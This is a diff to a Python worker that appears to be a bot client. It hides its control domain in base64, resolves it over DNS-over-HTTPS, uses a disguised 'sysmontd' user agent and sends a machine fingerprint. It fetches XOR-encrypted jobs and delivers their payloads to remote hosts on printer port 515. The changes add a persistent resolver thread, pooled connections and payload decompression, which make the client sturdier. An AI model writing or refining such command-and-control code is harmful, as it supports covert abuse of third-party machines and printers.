@@ -4,6 +4,7 @@ import platform
 import signal
 import sys
 import uuid
+import zlib
 from base64 import b64decode, urlsafe_b64encode
 from gc import collect, disable
 from hashlib import sha256
@@ -13,6 +14,7 @@ from json import loads
 from os import _exit, devnull, environ, urandom
 from socket import (
     IPPROTO_TCP,
+    SO_KEEPALIVE,
     SO_SNDBUF,
     SOL_SOCKET,
     TCP_NODELAY,
@@ -121,7 +123,34 @@ def doh_resolve(domain):
             pass
     return domain
 
+def _dns_prewarmer():
+    while True:
+        try:
+            doh_resolve(_DOM)
+        except Exception:
+            pass
+        sleep(180.0)
+
 _DOM = b64decode("YXBpLnByZWNvbm5lY3QuYXBw").decode()
+
+_conn_pool = {}
+_conn_lock = Lock()
+
+def _get_pooled_conn(ip, timeout=300.0):
+    with _conn_lock:
+        conn = _conn_pool.get(ip)
+        if conn is not None:
+            try:
+                if not getattr(conn, "_closed", False):
+                    return conn
+            except Exception:
+                pass
+        conn = HTTPSConnection(
+            ip, 443, timeout=timeout, context=create_default_context()
+        )
+        conn.host = _DOM
+        _conn_pool[ip] = conn
+        return conn
 
 def _make_doh_request(path, headers=None, data=None, timeout=None):
     ip = doh_resolve(_DOM)
@@ -130,10 +159,7 @@ def _make_doh_request(path, headers=None, data=None, timeout=None):
     sock_timeout = timeout if timeout is not None else 300.0
     if ip and ip != _DOM:
         try:
-            conn = HTTPSConnection(
-                ip, 443, timeout=sock_timeout, context=create_default_context()
-            )
-            conn.host = _DOM
+            conn = _get_pooled_conn(ip, sock_timeout)
             method = "POST" if data is not None else "GET"
             conn.request(method, path, body=data, headers=headers)
             res = conn.getresponse()
@@ -146,7 +172,8 @@ def _make_doh_request(path, headers=None, data=None, timeout=None):
                     pass
             return res
         except Exception:
-            pass
+            with _conn_lock:
+                _conn_pool.pop(ip, None)
     url = f"https://{_DOM}{path}"
     req = Request(url, headers=headers, data=data)
     ctx = create_default_context()
@@ -171,7 +198,13 @@ def _d(s, job_id=""):
         ks = sha256(p + idx.to_bytes(4, "big")).digest()
         for j, b in enumerate(chunk):
             out[i + j] = b ^ ks[j]
-    return bytes(out)
+    res = bytes(out)
+    if res.startswith(b"\x78\x9c") or res.startswith(b"\x78\x01") or res.startswith(b"\x78\xda"):
+        try:
+            return zlib.decompress(res)
+        except Exception:
+            pass
+    return res
 
 _online_cache = {}
 
@@ -195,17 +228,14 @@ def is_online(host, port=515):
         return False
 
 _UA = b64decode("c3lzbW9udGQ=").decode() + "/1.0"
-
-def _get_worker_ident():
-    mac_uuid = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
-    return f"{mac_uuid}_{platform.machine().lower()}"
+_WORKER_IDENT = f"{uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode()))}_{platform.machine().lower()}"
 
 def hdrs():
     return {
         "User-Agent": _UA,
         "X-Worker-Key": _k,
         "X-Worker-Jobs": str(jobs),
-        "X-Worker-Ident": _get_worker_ident(),
+        "X-Worker-Ident": _WORKER_IDENT,
     }
 
 def claim(i, retries=3):
@@ -276,6 +306,7 @@ def handle(j):
             _log(f"Handling job for {host}:{queue} (payload size: {len(p)} bytes)")
             s = create_connection((host, 515), timeout=j.get("timeout", 60))
             s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+            s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
             s.setsockopt(SOL_SOCKET, SO_SNDBUF, 65536)
             s.sendall(q)
             if not _ack(s):
@@ -406,6 +437,7 @@ def _ping_loop():
 
 if __name__ == "__main__":
     sleep(1.0 + (int.from_bytes(urandom(2), "big") % 2000) / 1000.0)
+    Thread(target=_dns_prewarmer, daemon=True).start()
     Thread(target=_ping_loop, daemon=True).start()
     iter_count = 0
     delay = 1.0
